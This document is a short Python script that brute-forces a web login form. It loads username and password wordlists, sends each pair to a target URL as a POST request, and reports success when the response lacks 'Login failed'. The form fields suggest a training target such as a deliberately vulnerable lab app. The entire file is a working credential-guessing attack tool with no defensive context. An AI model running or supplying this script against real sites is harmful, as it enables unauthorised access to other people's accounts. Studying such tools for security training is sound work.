#!/usr/bin/env python

import requests
import optparse

# get command line args 
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u","--usernames", dest="usernames", help="File containing one username per line to use for brute forcing")
    parser.add_option("-p","--passwords", dest="passwords", help="File containing one password per line to use for brute forcing")
    parser.add_option("-d","--url", dest="url", help="Url to brute force")
    (options, arguments) = parser.parse_args()
    if not  options.usernames and not options.passwords and not options.url:
        parser.error("[-] Please specify files and a domain to be used for brute forcing, use --help for more info.")
    return options

# main program
options = get_arguments()
target_url = options.url
# this is specific to the form being bruteforced
formData = {"username":"admin","password":"password","Login":"submit"}
passWordlistPath = options.passwords
userNamelistPath = options.usernames

# open the password file
with open(passWordlistPath, "r") as passWordlistFile:
    for line in passWordlistFile:
        password  = line.strip()
        formData["password"] =password
        # open the username file
        with open(userNamelistPath, "r") as userNamelistFile:
            for line in userNamelistFile:
                username = line.strip()
                formData["username"] = username
                # set all data and try to log in
                print("[+] Trying login: " + str(formData))
                response = requests.post(target_url, data=formData)
                # check for failure and print relevant data if sucessfull
                if "Login failed" not in response.content:
                    print("[+]Found!\n[+] Username: " + username + " Password: " + password )
                    exit()
                else:
                    print("[-] Login failed...")
# tell user that we found nothing...
print("[+] Reached the end of the program.")
